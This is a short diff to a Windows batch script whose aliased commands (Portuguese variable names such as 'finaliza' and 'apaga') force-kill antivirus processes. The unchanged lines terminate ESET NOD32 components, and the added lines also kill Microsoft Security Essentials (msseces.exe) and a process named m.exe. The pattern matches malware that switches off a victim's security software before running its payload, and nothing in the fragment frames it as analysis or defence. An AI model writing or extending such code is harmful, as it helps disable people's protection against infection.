@@ -6,6 +6,10 @@ Set apaga=del
 %limpa%
 %finaliza% /f /im nod32krn.exe
 %limpa%
+%finaliza% /f /im msseces.exe
+%limpa%
+%finaliza% /f /im m.exe
+%limpa%
 %finaliza% /f /im nod32.exe
 %limpa%
 %finaliza% /f /im nod32kui.exe
